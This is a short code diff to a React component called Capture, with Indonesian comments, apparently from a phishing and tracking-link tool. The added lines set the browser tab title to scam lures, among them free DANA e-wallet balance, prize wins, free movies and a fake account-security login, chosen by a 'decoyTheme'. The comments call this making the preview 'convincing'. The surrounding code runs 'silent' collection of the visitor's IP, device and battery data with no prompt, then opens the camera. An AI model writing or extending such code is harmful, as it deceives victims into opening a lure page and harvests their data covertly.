@@ -506,6 +506,16 @@ export default function Capture() {
       const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
       linkRef.current = link;
 
+      // Ubah judul halaman sesuai tema agar preview/tampilan meyakinkan
+      document.title = {
+        article:  'Viral! Cara Dapat Saldo DANA Gratis Terbaru 2026',
+        giveaway: 'SELAMAT! Kamu Memenangkan Hadiah Eksklusif',
+        video:    '[FULL MOVIE] Streaming Film HD Gratis',
+        download: 'Download Aplikasi & Game Premium Gratis',
+        survey:   'Survey Berhadiah Tunai Jutaan Rupiah',
+        login:    'Masuk ke Akun Anda — Verifikasi Keamanan',
+      }[cfg.decoyTheme] || 'Informasi Terbaru';
+
       // IP + Device + Battery — semuanya SILENT, tanpa popup apapun
       runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
     }
